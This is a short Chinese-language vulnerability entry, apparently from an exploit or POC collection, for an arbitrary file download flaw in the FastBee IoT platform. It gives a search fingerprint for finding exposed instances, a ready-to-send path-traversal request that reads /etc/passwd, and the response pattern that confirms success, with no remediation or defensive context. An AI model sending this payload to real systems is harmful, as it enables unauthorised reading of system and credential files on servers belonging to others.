# 蜂信物联(FastBee)物联网平台任意文件下载漏洞

蜂信物联(FastBee)物联网平台任意文件下载 ｜ 其他 ｜ —
- **指纹**：`title="FastBee"`
- **请求**：`GET /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd`

**Payload**
```
HTTP/1.1
Host:
```
- **响应特征**：200 root:x:0:0:root:/root:/bin/bash